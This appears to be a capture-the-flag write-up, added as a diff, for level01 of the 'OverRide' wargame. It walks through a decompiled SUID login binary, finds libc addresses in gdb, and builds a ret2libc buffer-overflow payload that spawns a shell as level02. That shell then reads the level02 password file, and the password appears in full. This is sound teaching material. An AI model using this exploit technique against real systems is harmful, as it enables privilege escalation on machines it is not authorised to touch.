@@ -1,0 +1,101 @@
+Upon login we're greeted by the usual information:
+
+```shell
+RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
+Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   /home/users/level01/level01
+```
+
+There is a SUID binary owned by `level02` which prompts for a username, which we don't have. Let's look at the decompiled code:
+
+```C
+_BOOL4 verify_user_name()
+{
+  puts("verifying username....\n");
+  return memcmp(a_user_name, "dat_wil", 7u) != 0;
+}
+
+_BOOL4 __cdecl verify_user_pass(const void *a1)
+{
+  return memcmp(a1, "admin", 5u) != 0;
+}
+
+int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  char s[64]; // [esp+1Ch] [ebp-4Ch] BYREF
+  _BOOL4 v5; // [esp+5Ch] [ebp-Ch]
+
+  memset(s, 0, sizeof(s));
+  v5 = 0;
+  puts("********* ADMIN LOGIN PROMPT *********");
+  printf("Enter Username: ");
+  fgets(a_user_name, 256, stdin);
+  v5 = verify_user_name();
+  if ( v5 )
+  {
+    puts("nope, incorrect username...\n");
+  }
+  else
+  {
+    puts("Enter Password: ");
+    fgets(s, 100, stdin);
+    v5 = verify_user_pass(s);
+    puts("nope, incorrect password...\n");
+  }
+  return 1;
+}
+```
+
+This reveals the username `dat_wil` and the password `admin`. 
+
+```shell
+level01@OverRide:~$ ./level01
+********* ADMIN LOGIN PROMPT *********
+Enter Username: dat_wil
+verifying username....
+
+Enter Password:
+admin
+nope, incorrect password...
+```
+
+The username is correct, but the password doesn't seem to work. Taking a closer look at the source code we can see that it doesn't matter which password we enter as the result remains the same. However we can overflow the `fgets` and launch our own shell with `return2libc`. 
+
+In order to do so we need a few addresses to build our payload. First the offset of our buffer, which we can get by using a pattern-generator. With that we know the offset is `80`. Next we need the address of `system`, `exit` and our `/bin/sh`.
+
+```shell
+level01@OverRide:~$ gdb level01
+[...]
+(gdb) break main
+Breakpoint 1 at 0x80484d5
+(gdb) r
+Starting program: /home/users/level01/level01
+
+Breakpoint 1, 0x080484d5 in main ()
+(gdb) print system
+$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
+(gdb) find &system, +9999999, "/bin/sh"
+0xf7f897ec
+warning: Unable to access target memory at 0xf7fd3b74, halting search.
+1 pattern found.
+(gdb) print exit
+$2 = {<text variable, no debug info>} 0xf7e5eb70 <exit>
+```
+
+Now we can build our payload which will look as follows:
+
+[filling the buffer] + [system] + [exit] + [/bin/sh]
+
+```shell
+level01@OverRide:~$  python -c 'print "dat_wil\n" + "A" * 80 + "\xd0\xae\xe6\xf7" + "\x70\xeb\xe5\xf7" + "\xec\x97\xf8\xf7"' > /tmp/file
+level01@OverRide:~$ cat /tmp/file - | ./level01
+********* ADMIN LOGIN PROMPT *********
+Enter Username: verifying username....
+
+Enter Password:
+nope, incorrect password...
+
+whoami
+level02
+cat /home/users/level02/.pass
+PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
+```
